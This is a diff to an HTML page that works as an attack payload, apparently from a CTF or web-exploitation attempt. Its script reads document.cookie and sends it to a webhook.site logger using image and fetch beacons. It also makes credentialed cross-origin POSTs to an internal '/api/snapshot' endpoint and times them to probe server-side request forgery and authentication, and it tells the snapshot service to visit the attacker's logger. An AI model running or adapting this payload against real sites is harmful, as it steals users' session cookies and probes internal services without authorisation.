@@ -1,6 +1,8 @@
 <!doctype html><html><head><meta charset="utf-8"><title>preview</title></head>
 <body>
 <img src="https://webhook.site/a9fd0313-52f4-4ea5-935c-781e7fe64098/NOJS-VISIT" width="1" height="1">
+<!-- keepalive: hold the page open ~12s so slow responses resolve -->
+<img src="https://httpstat.us/200?sleep=12000" width="1" height="1">
 <h1>preview</h1>
 <script>
 (function(){
@@ -10,13 +12,15 @@
  function B(tag,data){data=(''+(data||'')).slice(0,1600);
    try{new Image().src=WH+tag+'?d='+encodeURIComponent(data);}catch(e){}
    try{fetch(WH+tag,{method:'POST',body:data,mode:'no-cors'});}catch(e){}}
- B('00-JS-RAN','href='+location.href+' ck='+document.cookie);
- // snapshot pointed at OUR logger (no-cors, NO json header -> valid). If snapshot svc visits us -> reachable+authed; check cookie.
- try{fetch(W+'/api/snapshot',{method:'POST',credentials:'include',mode:'no-cors',body:JSON.stringify({url:WH+'SNAPCB'})}).then(()=>B('snap1-sent','ok')).catch(e=>B('snap1-fail',''+e));}catch(e){B('snap1-ex',''+e);}
- // control: snapshot internal web:3000/ (no-cors)
- try{fetch(W+'/api/snapshot',{method:'POST',credentials:'include',mode:'no-cors',body:JSON.stringify({url:W+'/'})}).then(()=>B('snap2-internal-sent','ok')).catch(e=>B('snap2-fail',''+e));}catch(e){B('snap2-ex',''+e);}
- // try reading home with no-cors just to confirm reachability (opaque)
- try{fetch(W+'/',{credentials:'include',mode:'no-cors'}).then(r=>B('home-nocors','type='+r.type)).catch(e=>B('home-nocors-fail',''+e));}catch(e){}
+ B('00-JS-RAN','ck='+document.cookie);
+ function timed(tag,cred){var t0=Date.now();
+   fetch(W+'/api/snapshot',{method:'POST',mode:'no-cors',credentials:cred,body:JSON.stringify({url:W+'/'})})
+    .then(()=>B(tag,'ms='+(Date.now()-t0)+' cred='+cred))
+    .catch(e=>B(tag+'-ERR','ms='+(Date.now()-t0)+' '+e));}
+ timed('AUTH-incl','include');
+ timed('AUTH-omit','omit');
+ // snapshot our logger WITH keepalive so service (if any) has time to visit
+ fetch(W+'/api/snapshot',{method:'POST',mode:'no-cors',credentials:'include',body:JSON.stringify({url:WH+'SNAPCB'})}).then(()=>B('snapcb-sent','ok')).catch(e=>B('snapcb-err',''+e));
 })();
 </script>
 </body></html>
